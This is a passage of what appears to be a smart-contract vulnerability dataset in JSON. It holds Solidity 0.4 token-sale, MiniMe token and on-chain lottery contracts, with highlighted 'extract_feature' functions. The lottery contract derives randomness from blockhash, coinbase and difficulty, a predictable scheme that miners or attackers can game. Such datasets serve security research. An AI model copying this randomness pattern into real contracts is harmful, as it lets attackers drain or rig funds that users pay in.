if (isContract(controller)) {\n require(TokenController(controller).onTransfer(_from, _to, _amount));\n }\n updateValueAtNow(balances[_from], previousBalanceFrom - _amount);\n var previousBalanceTo = balanceOfAt(_to, block.number);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(balances[_to], previousBalanceTo + _amount);\n Transfer(_from, _to, _amount);\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balanceOfAt(_owner, block.number);\n }\n function approve(address _spender, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n require((_amount == 0) || (allowed[msg.sender][_spender] == 0));\n if (isContract(controller)) {\n require(TokenController(controller).onApprove(msg.sender, _spender, _amount));\n }\n allowed[msg.sender][_spender] = _amount;\n Approval(msg.sender, _spender, _amount);\n return true;\n }\n function allowance(address _owner, address _spender\n ) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function approveAndCall(address _spender, uint256 _amount, bytes _extraData\n ) public returns (bool success) {\n require(approve(_spender, _amount));\n ApproveAndCallFallBack(_spender).receiveApproval(\n msg.sender,\n _amount,\n this,\n _extraData\n );\n return true;\n }\n function totalSupply() public constant returns (uint) {\n return totalSupplyAt(block.number);\n }\n function balanceOfAt(address _owner, uint _blockNumber) public constant\n returns (uint) {\n if ((balances[_owner].length == 0)\n || (balances[_owner][0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.balanceOfAt(_owner, min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(balances[_owner], _blockNumber);\n }\n }\n function totalSupplyAt(uint _blockNumber) public constant returns(uint) {\n if ((totalSupplyHistory.length == 0)\n || (totalSupplyHistory[0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.totalSupplyAt(min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(totalSupplyHistory, _blockNumber);\n }\n }\n function createCloneToken(\n string _cloneTokenName,\n uint8 _cloneDecimalUnits,\n string _cloneTokenSymbol,\n uint _snapshotBlock,\n bool _transfersEnabled\n ) public returns(address) {\n if (_snapshotBlock == 0) _snapshotBlock = block.number;\n MiniMeToken cloneToken = tokenFactory.createCloneToken(\n this,\n _snapshotBlock,\n _cloneTokenName,\n _cloneDecimalUnits,\n _cloneTokenSymbol,\n _transfersEnabled\n );\n cloneToken.changeController(msg.sender);\n NewCloneToken(address(cloneToken), _snapshotBlock);\n return address(cloneToken);\n }\n function generateTokens(address _owner, uint _amount\n ) public onlyController returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply + _amount >= curTotalSupply);\n uint previousBalanceTo = balanceOf(_owner);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(totalSupplyHistory, curTotalSupply + _amount);\n updateValueAtNow(balances[_owner], previousBalanceTo + _amount);\n Transfer(0, _owner, _amount);\n return true;\n }\n function destroyTokens(address _owner, uint _amount\n ) onlyController public returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply >= _amount);\n uint previousBalanceFrom = balanceOf(_owner);\n require(previousBalanceFrom >= _amount);\n updateValueAtNow(totalSupplyHistory, curTotalSupply - _amount);\n updateValueAtNow(balances[_owner], previousBalanceFrom - _amount);\n Transfer(_owner, 0, _amount);\n return true;\n }\n function enableTransfers(bool _transfersEnabled) public onlyController {\n transfersEnabled = _transfersEnabled;\n }\n function getValueAt(Checkpoint[] storage checkpoints, uint _block\n ) constant internal returns (uint) {\n if (checkpoints.length == 0) return 0;\n if (_block >= checkpoints[checkpoints.length-1].fromBlock)\n return checkpoints[checkpoints.length-1].value;\n if (_block < checkpoints[0].fromBlock) return 0;\n uint min = 0;\n uint max = checkpoints.length-1;\n while (max > min) {\n uint mid = (max + min + 1)/ 2;\n if (checkpoints[mid].fromBlock<=_block) {\n min = mid;\n } else {\n max = mid-1;\n }\n }\n return checkpoints[min].value;\n }\n function updateValueAtNow(Checkpoint[] storage checkpoints, uint _value\n ) internal {\n if ((checkpoints.length == 0)\n || (checkpoints[checkpoints.length -1].fromBlock < block.number)) {\n Checkpoint storage newCheckPoint = checkpoints[ checkpoints.length++ ];\n newCheckPoint.fromBlock = uint128(block.number);\n newCheckPoint.value = uint128(_value);\n } else {\n Checkpoint storage oldCheckPoint = checkpoints[checkpoints.length-1];\n oldCheckPoint.value = uint128(_value);\n }\n }\n function isContract(address _addr) constant internal returns(bool) {\n uint size;\n if (_addr == 0) return false;\n assembly {\n size := extcodesize(_addr)\n }\n return size>0;\n }\n function min(uint a, uint b) pure internal returns (uint) {\n return a < b ? a : b;\n }\n function () public payable {\n require(isContract(controller));\n require(TokenController(controller).proxyPayment.value(msg.value)(msg.sender));\n }\n function claimTokens(address _token) public onlyController {\n if (_token == 0x0) {\n controller.transfer(this.balance);\n return;\n }\n MiniMeToken token = MiniMeToken(_token);\n uint balance = token.balanceOf(this);\n token.transfer(controller, balance);\n ClaimedTokens(_token, controller, balance);\n }\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n event Transfer(address indexed _from, address indexed _to, uint256 _amount);\n event NewCloneToken(address indexed _cloneToken, uint _snapshotBlock);\n event Approval(\n address indexed _owner,\n address indexed _spender,\n uint256 _amount\n );\n}\ncontract MiniMeTokenFactory {\n function createCloneToken(\n address _parentToken,\n uint _snapshotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public returns (MiniMeToken) {\n MiniMeToken newToken = new MiniMeToken(\n this,\n _parentToken,\n _snapshotBlock,\n _tokenName,\n _decimalUnits,\n _tokenSymbol,\n _transfersEnabled\n );\n newToken.changeController(msg.sender);\n return newToken;\n }\n}\ncontract Crowdsale is Presale, Pausable, CanReclaimToken {\n using SafeMath for uint256;\n address public whitelistAddress;\n address public wallet;\n MiniMeToken public token;\n uint256 private weiRaised = 0;\n uint256 private cap = 0;\n bool private publicSaleInitialized = false;\n bool private finalized = false;\n uint256 private tokensSold = 0;\n uint256 private startTime;\n uint256 private endTime;\n uint256 public maxTokens;\n mapping(address => uint256) public contributions;\n mapping(address => uint256) public investorCaps;\n address[] public investors;\n address[] public founders;\n address[] public advisors;\n VestingTrustee public trustee;\n address public reserveWallet;\n struct Tier {\n uint256 rate;\n uint256 max;\n }\n uint public privateSaleTokensAvailable;\n uint public privateSaleTokensSold = 0;\n uint public publicTokensAvailable;\n uint8 public totalTiers = 0;\n bool public tiersInitialized = false;\n uint256 public maxTiers = 6;\n Tier[6] public tiers;\n event TokenPurchase(address indexed purchaser, uint256 value, uint256 amount);\n enum Stage { Preparing, Presale, PresaleFinished, PublicSale, Success, Finalized }\n function Crowdsale(\n uint256 _presaleStartTime,\n uint256 _presaleDuration,\n uint256 _presaleRate,\n uint256 _presaleCap,\n address erc20Token,\n address _wallet,\n uint8 _tiers,\n uint256 _cap,\n address _reserveWallet)\n public\n Presale(_presaleStartTime, _presaleDuration, _presaleRate, _presaleCap)\n {\n require(_wallet != address(0));\n require(erc20Token != address(0));\n require(_tiers > 0 && _tiers <= maxTiers);\n require(_cap > 0);\n require(_reserveWallet != address(0));\n token = MiniMeToken(erc20Token);\n wallet = _wallet;\n totalTiers = _tiers;\n cap = _cap;\n reserveWallet = _reserveWallet;\n trustee = new VestingTrustee(erc20Token);\n maxTokens = 1000000000 * (10 ** 18);\n tokensSold = token.totalSupply();\n privateSaleTokensAvailable = maxTokens.mul(22).div(100);\n publicTokensAvailable = maxTokens.mul(28).div(100);\n super.addAddressToWhitelist(msg.sender);\n }\n function() public payable {\n buyTokens(msg.sender, msg.value);\n }\n function getStage() public constant returns(Stage) {\n if (finalized) return Stage.Finalized;\n if (!tiersInitialized || !Presale.hasStarted()) return Stage.Preparing;\n if (!Presale.hasEnded()) return Stage.Presale;\n if (Presale.hasEnded() && !hasStarted()) return Stage.PresaleFinished;\n if (!hasEnded()) return Stage.PublicSale;\n if (hasEnded()) return Stage.Success;\n return Stage.Preparing;\n }\n modifier inStage(Stage _stage) {\n require(getStage() == _stage);\n _;\n }\n function initTiers(uint256[] rates, uint256[] totalWeis) public onlyWhitelisted returns(uint256) {\n require(token.controller() == address(this));\n require(!tiersInitialized);\n require(rates.length == totalTiers && rates.length == totalWeis.length);\n uint256 tierMax = 0;\n for (uint8 i=0; i < totalTiers; i++) {\n require(totalWeis[i] > 0 && rates[i] > 0);\n tierMax = tierMax.add(totalWeis[i]);\n tiers[i] = Tier({\n rate: rates[i],\n max: tierMax\n });\n }\n require(tierMax == cap);\n tiersInitialized = true;\n return tierMax;\n }\n function setCapForParticipants(address[] participants, uint256[] caps) onlyWhitelisted public {\n require(participants.length <= 50 && participants.length == caps.length);\n for (uint8 i=0; i < participants.length; i++) {\n investorCaps[participants[i]] = caps[i];\n }\n }\n function addGrant(address assignee, uint256 value, bool isFounder) public onlyWhitelisted whenNotPaused {\n require(value > 0);\n require(assignee != address(0));\n uint256 start;\n uint256 cliff;\n uint256 vestingPercentage;\n uint256 initialTokens;\n if(isFounder) {\n start = now;\n cliff = start + 12*30 days;\n vestingPercentage = 20;\n founders.push(assignee);\n }\n else {\n initialTokens = value.mul(10).div(100);\n transferTokens(assignee, initialTokens);\n start = now;\n cliff = start + 6*30 days;\n vestingPercentage = 15;\n advisors.push(assignee);\n }\n uint256 end = now + 3 * 1 years;\n uint256 installmentLength = 6 * 30 days;\n bool revokable = true;\n transferTokens(trustee, value.sub(initialTokens));\n trustee.grant(assignee, value, start, cliff, end, installmentLength, vestingPercentage, initialTokens, revokable);\n }\n function finalize() public onlyWhitelisted inStage(Stage.Success) {\n require(!finalized);\n trustee.transferOwnership(msg.sender);\n token.enableTransfers(true);\n uint256 unsold = maxTokens.sub(token.totalSupply());\n transferTokens(reserveWallet, unsold);\n token.changeController(0x0);\n finalized = true;\n }\n function startPublicSale(uint _startTime, uint _duration) public onlyWhitelisted inStage(Stage.PresaleFinished) {\n require(_startTime >= now);\n require(_duration > 0);\n startTime = _startTime;\n endTime = _startTime + _duration * 1 days;\n publicSaleInitialized = true;\n }\n function totalWei() public constant returns(uint256) {\n uint256 presaleWei = super.totalWei();\n return presaleWei.add(weiRaised);\n }\n function totalPublicSaleWei() public constant returns(uint256) {\n return weiRaised;\n }\n function totalCap() public constant returns(uint256) {\n uint256 presaleCap = super.totalCap();\n return presaleCap.add(cap);\n }\n function totalTokens() public constant returns(uint256) {\n return tokensSold;\n }\n function buyTokens(address purchaser, uint256 value) internal whenNotPaused returns(uint256) {\n require(value > 0);\n Stage stage = getStage();\n require(stage == Stage.Presale || stage == Stage.PublicSale);\n uint256 purchaseAmount = Math.min256(value, investorCaps[purchaser].sub(contributions[purchaser]));\n require(purchaseAmount > 0);\n uint256 numTokens;\n if (stage == Stage.Presale) {\n if (Presale.totalWei().add(purchaseAmount) > Presale.totalCap()) {\n purchaseAmount = Presale.capRemaining();\n }\n numTokens = Presale.buyTokens(purchaser, purchaseAmount);\n } else if (stage == Stage.PublicSale) {\n uint totalWei = weiRaised.add(purchaseAmount);\n uint8 currentTier = getTier(weiRaised);\n if (totalWei >= cap) {\n totalWei = cap;\n purchaseAmount = cap.sub(weiRaised);\n }\n if (totalWei <= tiers[currentTier].max) {\n numTokens = purchaseAmount.mul(tiers[currentTier].rate);\n } else {\n uint remaining = tiers[currentTier].max.sub(weiRaised);\n numTokens = remaining.mul(tiers[currentTier].rate);\n uint256 excess = totalWei.sub(tiers[currentTier].max);\n numTokens = numTokens.add(excess.mul(tiers[currentTier + 1].rate));\n }\n weiRaised = weiRaised.add(purchaseAmount);\n }\n require(tokensSold.add(numTokens) <= publicTokensAvailable);\n tokensSold = tokensSold.add(numTokens);\n forwardFunds(purchaser, purchaseAmount);\n transferTokens(purchaser, numTokens);\n if (value.sub(purchaseAmount) > 0) {\n msg.sender.transfer(value.sub(purchaseAmount));\n }\n TokenPurchase(purchaser, numTokens, purchaseAmount);\n return numTokens;\n }\n function forwardFunds(address purchaser, uint256 value) internal {\n contributions[purchaser] = contributions[purchaser].add(value);\n wallet.transfer(value);\n }\n function changeEndTime(uint _endTime) public onlyWhitelisted {\n endTime = _endTime;\n }\n function changeFundsWallet(address _newWallet) public onlyWhitelisted {\n require(_newWallet != address(0));\n wallet = _newWallet;\n }\n function changeTokenController() onlyWhitelisted public {\n token.changeController(msg.sender);\n }\n function changeTrusteeOwner() onlyWhitelisted public {\n trustee.transferOwnership(msg.sender);\n }\n function changeReserveWallet(address _reserve) public onlyWhitelisted {\n require(_reserve != address(0));\n reserveWallet = _reserve;\n }\n function setWhitelistAddress(address _whitelist) public onlyWhitelisted {\n require(_whitelist != address(0));\n whitelistAddress = _whitelist;\n }\n function transferTokens(address to, uint256 value) internal {\n uint totalSupply = token.totalSupply();\n require(totalSupply.add(value) <= maxTokens);\n token.generateTokens(to, value);\n }\n function sendPrivateSaleTokens(address to, uint256 value) public whenNotPaused onlyWhitelisted {\n require(privateSaleTokensSold.add(value) <= privateSaleTokensAvailable);\n privateSaleTokensSold = privateSaleTokensSold.add(value);\n transferTokens(to, value);\n }\n function hasEnded() internal constant returns(bool) {\n return now > endTime || weiRaised >= cap;\n }\n function hasStarted() internal constant returns(bool) {\n return publicSaleInitialized && now >= startTime;\n }\n function getTier(uint256 _weiRaised) internal constant returns(uint8) {\n for (uint8 i = 0; i < totalTiers; i++) {\n if (_weiRaised < tiers[i].max) {\n return i;\n }\n }\n return totalTiers + 1;\n }\n function getCurrentTier() public constant returns(uint8) {\n return getTier(weiRaised);\n }\n function proxyPayment(address _owner) public payable returns(bool) {\n return true;\n }\n function onApprove(address _owner, address _spender, uint _amount) public returns(bool) {\n return true;\n }\n function onTransfer(address _from, address _to, uint _amount) public returns(bool) {\n return true;\n }\n function getTokenSaleTime() public constant returns(uint256, uint256) {\n return (startTime, endTime);\n }\n}",
  "extract_feature": [
    "function balanceOf(address _owner) public constant returns (uint256 balance) {\nreturn balanceOfAt(_owner, block.number);\n}",
    "function totalSupply() public constant returns (uint) {\nreturn totalSupplyAt(block.number);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b1a"
  },
  "filename": "127.sol",
  "content": "pragma solidity ^0.4.23;\ncontract AccessAdmin {\n bool public isPaused = false;\n address public addrAdmin;\n event AdminTransferred(address indexed preAdmin, address indexed newAdmin);\n constructor() public {\n addrAdmin = msg.sender;\n }\n modifier onlyAdmin() {\n require(msg.sender == addrAdmin);\n _;\n }\n modifier whenNotPaused() {\n require(!isPaused);\n _;\n }\n modifier whenPaused {\n require(isPaused);\n _;\n }\n function setAdmin(address _newAdmin) external onlyAdmin {\n require(_newAdmin != address(0));\n emit AdminTransferred(addrAdmin, _newAdmin);\n addrAdmin = _newAdmin;\n }\n function doPause() external onlyAdmin whenNotPaused {\n isPaused = true;\n }\n function doUnpause() external onlyAdmin whenPaused {\n isPaused = false;\n }\n}\ncontract AccessService is AccessAdmin {\n address public addrService;\n address public addrFinance;\n modifier onlyService() {\n require(msg.sender == addrService);\n _;\n }\n modifier onlyFinance() {\n require(msg.sender == addrFinance);\n _;\n }\n function setService(address _newService) external {\n require(msg.sender == addrService || msg.sender == addrAdmin);\n require(_newService != address(0));\n addrService = _newService;\n }\n function setFinance(address _newFinance) external {\n require(msg.sender == addrFinance || msg.sender == addrAdmin);\n require(_newFinance != address(0));\n addrFinance = _newFinance;\n }\n function withdraw(address _target, uint256 _amount)\n external\n {\n require(msg.sender == addrFinance || msg.sender == addrAdmin);\n require(_amount > 0);\n address receiver = _target == address(0) ? addrFinance : _target;\n uint256 balance = address(this).balance;\n if (_amount < balance) {\n receiver.transfer(_amount);\n } else {\n receiver.transfer(address(this).balance);\n }\n }\n}\ninterface WonderTokenInterface {\n function transferFrom(address _from, address _to, uint256 _tokenId) external;\n function safeGiveByContract(uint256 _tokenId, address _to) external;\n function getProtoIdByTokenId(uint256 _tokenId) external view returns(uint256);\n}\ninterface ManagerTokenInterface {\n function transferFrom(address _from, address _to, uint256 _tokenId) external;\n function safeGiveByContract(uint256 _tokenId, address _to) external;\n function getProtoIdByTokenId(uint256 _tokenId) external view returns(uint256);\n}\ninterface TalentCardInterface {\n function safeSendCard(uint256 _amount, address _to) external;\n}\ninterface ERC20BaseInterface {\n function balanceOf(address _from) external view returns(uint256);\n function transfer(address _to, uint256 _value) external;\n function transferFrom(address _from, address _to, uint256 _value) external returns (bool);\n function approve(address _spender, uint256 _value) external;\n}\ncontract TTCInterface is ERC20BaseInterface {\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) external returns (bool);\n}\ncontract Random {\n uint256 _seed;\n function _rand() internal returns (uint256) {\n _seed = uint256(keccak256(abi.encodePacked(_seed, blockhash(block.number - 1), block.coinbase, block.difficulty)));\n return _seed;\n }\n function _randBySeed(uint256 _outSeed) internal view returns (uint256) {\n return uint256(keccak256(abi.encodePacked(_outSeed, blockhash(block.number - 1), block.coinbase, block.difficulty)));\n }\n}\ncontract TTLottery is AccessService, Random {\n TTCInterface ttcToken;\n ManagerTokenInterface ttmToken;\n WonderTokenInterface ttwToken;\n TalentCardInterface tttcToken;\n event ManagerSold(\n address indexed buyer,\n address indexed buyTo,\n uint256 mgrId,\n uint256 nextTokenId\n );\n event WonderSold(\n address indexed buyer,\n address indexed buyTo,\n uint256 wonderId,\n uint256 nextTokenId\n );\n event LotteryResult(\n address indexed buyer,\n address indexed buyTo,\n uint256 lotteryCount,\n uint256 lotteryRet\n );\n constructor() public {\n addrAdmin = msg.sender;\n addrFinance = msg.sender;\n addrService = msg.sender;\n ttcToken = TTCInterface(0xfB673F08FC82807b4D0E139e794e3b328d63551f);\n }\n function setTTMTokenAddress(address _addr) external onlyAdmin {\n require(_addr != address(0));\n ttmToken = ManagerTokenInterface(_addr);\n }\n function setTTWTokenAddress(address _addr) external onlyAdmin {\n require(_addr != address(0));\n ttwToken = WonderTokenInterface(_addr);\n }\n function setTTCTokenAddress(address _addr) external onlyAdmin {\n require(_addr != address(0));\n ttcToken = TTCInterface(_addr);\n }\n function setTalentCardAddress(address _addr) external onlyAdmin {\n require(_addr != address(0));\n tttcToken = TalentCardInterface(_addr);\n }\n mapping (address => uint64) public lotteryHistory;\n uint64 public nextLotteryTTMTokenId4 = 211;\n uint64 public nextLotteryTTMTokenId5 = 286;\n uint64 public nextLotteryTTMTokenId9 = 511;\n uint64 public nextLotteryTTMTokenId10 = 561;\n uint64 public nextLotteryTTWTokenId3 = 91;\n uint64 public nextLotteryTTWTokenId4 = 151;\n function setNextLotteryTTMTokenId4(uint64 _val) external onlyAdmin {\n require(nextLotteryTTMTokenId4 >= 211 && nextLotteryTTMTokenId4 <= 286);\n nextLotteryTTMTokenId4 = _val;\n }\n function setNextLotteryTTMTokenId5(uint64 _val) external onlyAdmin {\n require(nextLotteryTTMTokenId5 >= 286 && nextLotteryTTMTokenId5 <= 361);\n nextLotteryTTMTokenId5 = _val;\n }\n function setNextLotteryTTMTokenId9(uint64 _val) external onlyAdmin {\n require(nextLotteryTTMTokenId9 >= 511 && nextLotteryTTMTokenId9 <= 561);\n nextLotteryTTMTokenId9 = _val;\n }\n function setNextLotteryTTMTokenId10(uint64 _val) external onlyAdmin {\n require(nextLotteryTTMTokenId10 >= 561 && nextLotteryTTMTokenId10 <= 611);\n nextLotteryTTMTokenId10 = _val;\n }\n function setNextLotteryTTWTokenId3(uint64 _val) external onlyAdmin {\n require(nextLotteryTTWTokenId3 >= 91 && nextLotteryTTWTokenId3 <= 151);\n nextLotteryTTWTokenId3 = _val;\n }\n function setNextLotteryTTWTokenId4(uint64 _val) external onlyAdmin {\n require(nextLotteryTTWTokenId4 >= 151 && nextLotteryTTWTokenId4 <= 181);\n nextLotteryTTWTokenId4 = _val;\n }\n function _getExtraParam(bytes _extraData)\n private\n pure\n returns(address addr, uint256 lotteryCount)\n {\n assembly { addr := mload(add(_extraData, 20)) }\n lotteryCount = uint256(_extraData[20]);\n }\n function receiveApproval(address _sender, uint256 _value, address _token, bytes _extraData)\n external\n whenNotPaused\n {\n require(msg.sender == address(ttcToken));\n require(_extraData.length == 21);\n (address toAddr, uint256 lotteryCount) = _getExtraParam(_extraData);\n require(ttcToken.transferFrom(_sender, address(this), _value));\n if (lotteryCount == 1) {\n _lottery(_value, toAddr, _sender);\n } else if(lotteryCount == 5) {\n _lottery5(_value, toAddr, _sender);\n } else {\n require(false, \"Invalid lottery count\");\n }\n }\n function lotteryByETH(address _gameWalletAddr)\n external\n payable\n whenNotPaused\n {\n _lottery(msg.value, _gameWalletAddr, msg.sender);\n }\n function lotteryByETH5(address _gameWalletAddr)\n external\n payable\n whenNotPaused\n {\n _lottery5(msg.value, _gameWalletAddr, msg.sender);\n }\n function _lotteryCard(uint256 _seed, address _gameWalletAddr)\n private\n returns(uint256 lotteryRet)\n {\n uint256 rdm = _seed % 10000;\n if (rdm < 6081) {\n tttcToken.safeSendCard(1, _gameWalletAddr);\n lotteryRet = 1;\n } else if (rdm < 8108) {\n tttcToken.safeSendCard(3, _gameWalletAddr);\n lotteryRet = 2;\n } else if (rdm < 9324) {\n tttcToken.safeSendCard(5, _gameWalletAddr);\n lotteryRet = 3;\n } else {\n tttcToken.safeSendCard(10, _gameWalletAddr);\n lotteryRet = 4;\n }\n }\n function _lotteryCardNoSend(uint256 _seed)\n private\n pure\n returns(uint256 lotteryRet, uint256 cardCnt)\n {\n uint256 rdm = _seed % 10000;\n if (rdm < 6081) {\n cardCnt = 1;\n lotteryRet = 1;\n } else if (rdm < 8108) {\n cardCnt = 3;\n lotteryRet = 2;\n } else if (rdm < 9324) {\n cardCnt = 5;\n lotteryRet = 3;\n } else {\n cardCnt = 10;\n lotteryRet = 4;\n }\n }\n function _lotteryToken(uint256 _seed, address _gameWalletAddr, address _buyer)\n private\n returns(uint256 lotteryRet)\n {\n uint256[6] memory weightArray;\n uint256 totalWeight = 0;\n if (nextLotteryTTMTokenId4 <= 285) {\n totalWeight += 2020;\n weightArray[0] = totalWeight;\n }\n if (nextLotteryTTMTokenId5 <= 360) {\n totalWeight += 2020;\n weightArray[1] = totalWeight;\n }\n if (nextLotteryTTMTokenId9 <= 560) {\n totalWeight += 1340;\n weightArray[2] = totalWeight;\n }\n if (nextLotteryTTMTokenId10 <= 610) {\n totalWeight += 1340;\n weightArray[3] = totalWeight;\n }\n if (nextLotteryTTWTokenId3 <= 150) {\n totalWeight += 2220;\n weightArray[4] = totalWeight;\n }\n if (nextLotteryTTWTokenId4 <= 180) {\n totalWeight += 1000;\n weightArray[5] = totalWeight;\n }\n if (totalWeight > 0) {\n uint256 rdm = _seed % totalWeight;\n for (uint32 i = 0; i < 6; ++i) {\n if (weightArray[i] == 0 || rdm >= weightArray[i]) {\n continue;\n }\n if (i == 0) {\n nextLotteryTTMTokenId4 += 1;\n ttmToken.safeGiveByContract(nextLotteryTTMTokenId4 - 1, _gameWalletAddr);\n emit ManagerSold(_buyer, _gameWalletAddr, 4, nextLotteryTTMTokenId4);\n } else if (i == 1) {\n nextLotteryTTMTokenId5 += 1;\n ttmToken.safeGiveByContract(nextLotteryTTMTokenId5 - 1, _gameWalletAddr);\n emit ManagerSold(_buyer, _gameWalletAddr, 5, nextLotteryTTMTokenId5);\n } else if (i == 2) {\n nextLotteryTTMTokenId9 += 1;\n ttmToken.safeGiveByContract(nextLotteryTTMTokenId9 - 1, _gameWalletAddr);\n emit ManagerSold(_buyer, _gameWalletAddr, 9, nextLotteryTTMTokenId9);\n } else if (i == 3) {\n nextLotteryTTMTokenId10 += 1;\n ttmToken.safeGiveByContract(nextLotteryTTMTokenId10 - 1, _gameWalletAddr);\n emit ManagerSold(_buyer, _gameWalletAddr, 10, nextLotteryTTMTokenId10);\n } else if (i == 4) {\n nextLotteryTTWTokenId3 += 1;\n ttwToken.safeGiveByContract(nextLotteryTTWTokenId3 - 1, _gameWalletAddr);\n emit WonderSold(_buyer, _gameWalletAddr, 3, nextLotteryTTWTokenId3);\n } else {\n nextLotteryTTWTokenId4 += 1;\n ttwToken.safeGiveByContract(nextLotteryTTWTokenId4 - 1, _gameWalletAddr);\n emit WonderSold(_buyer, _gameWalletAddr, 4, nextLotteryTTWTokenId4);\n }\n lotteryRet = i + 5;\n break;\n }\n }\n }\n function _lottery(uint256 _value, address _gameWalletAddr, address _buyer)\n private\n {\n require(_value == 0.039 ether);\n require(_gameWalletAddr != address(0));\n uint256 lotteryRet;\n uint256 seed = _rand();\n uint256 rdm = seed % 10000;\n seed /= 10000;\n if (rdm < 400) {\n lotteryRet = _lotteryToken(seed, _gameWalletAddr, _buyer);\n if (lotteryRet == 0) {\n lotteryRet = _lotteryCard(seed, _gameWalletAddr);\n }\n } else {\n lotteryRet = _lotteryCard(seed, _gameWalletAddr);\n }\n lotteryHistory[_gameWalletAddr] = uint64(lotteryRet);\n emit LotteryResult(_buyer, _gameWalletAddr, 1, lotteryRet);\n }\n function _lottery5(uint256 _value, address _gameWalletAddr, address _buyer)\n private\n {\n require(_value == 0.1755 ether);\n require(_gameWalletAddr != address(0));\n uint256 seed = _rand();\n uint256 lotteryRet = 0;\n uint256 lRet;\n uint256 cardCountTotal = 0;\n uint256 cardCount;\n for (uint256 i = 0; i < 5; ++i) {\n if (i > 0) {\n seed = _randBySeed(seed);\n }\n uint256 rdm = seed % 10000;\n seed /= 10000;\n if (rdm < 400) {\n lRet = _lotteryToken(seed, _gameWalletAddr, _buyer);\n if (lRet == 0) {\n (lRet, cardCount) = _lotteryCardNoSend(seed);\n cardCountTotal += cardCount;\n }\n lotteryRet += (lRet * (100 ** i));\n } else {\n (lRet, cardCount) = _lotteryCardNoSend(seed);\n cardCountTotal += cardCount;\n lotteryRet += (lRet * (100 ** i));\n }\n }\n require(cardCountTotal <= 50);\n if (cardCountTotal > 0) {\n tttcToken.safeSendCard(cardCountTotal, _gameWalletAddr);\n }\n lotteryHistory[_gameWalletAddr] = uint64(lotteryRet);\n emit LotteryResult(_buyer, _gameWalletAddr, 5, lotteryRet);\n }\n function withdrawERC20(address _erc20, address _target, uint256 _amount)\n external\n {\n require(msg.sender == addrFinance || msg.sender == addrAdmin);\n require(_amount > 0);\n address receiver = _target == address(0) ? addrFinance : _target;\n ERC20BaseInterface erc20Contract = ERC20BaseInterface(_erc20);\n uint256 balance = erc20Contract.balanceOf(address(this));\n require(balance > 0);\n if (_amount < balance) {\n erc20Contract.transfer(receiver, _amount);\n } else {\n erc20Contract.transfer(receiver, balance);\n }\n }\n function getLotteryInfo(address _walletAddr)\n external\n view\n returns(\n uint64 ttmCnt4,\n uint64 ttmCnt5,\n uint64 ttmCnt9,\n uint64 ttmCnt10,\n uint64 ttWCnt3,\n uint64 ttwCnt4,\n uint64 lastLottery\n )\n {\n ttmCnt4 = 286 - nextLotteryTTMTokenId4;\n ttmCnt5 = 361 - nextLotteryTTMTokenId5;\n ttmCnt9 = 561 - nextLotteryTTMTokenId9;\n ttmCnt10 = 611 - nextLotteryTTMTokenId10;\n ttWCnt3 = 151 - nextLotteryTTWTokenId3;\n ttwCnt4 = 181 - nextLotteryTTWTokenId4;\n lastLottery = lotteryHistory[_walletAddr];\n }\n}",
  "extract_feature": [
    "function _rand() internal returns (uint256) {\n_seed = uint256(keccak256(abi.encodePacked(_seed, blockhash(block.number - 1), block.coinbase, block.difficulty)));\nreturn _seed;\n}",
    "function _randBySeed(uint256 _outSeed) internal view returns (uint256) {\nreturn uint256(keccak256(abi.encodePacked(_outSeed, blockhash(block.number - 1), block.coinbase, block.difficulty)));\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b1b"
  },
  "filename": "129.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract SimpleFlyDropToken is Claimable {\n using SafeMath for uint256;\n ERC20 internal erc20tk;\n function setToken(address _token) onlyOwner public {\n require(_token != address(0));\n erc20tk = ERC20(_token);\n }\n function multiSend(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(_destAddrs.length == _values.length);\n uint256 i = 0;\n for (; i < _destAddrs.length; i = i.add(1)) {\n if (!erc20tk.transfer(_destAddrs[i], _values[i])) {\n break;\n }\n }\n return (i);\n }\n}\ncontract DelayedClaimable is Claimable {\n uint256 public end;\n uint256 public start;\n function setLimits(uint256 _start, uint256 _end) onlyOwner public {\n require(_start <= _end);\n end = _end;\n start = _start;\n }\n 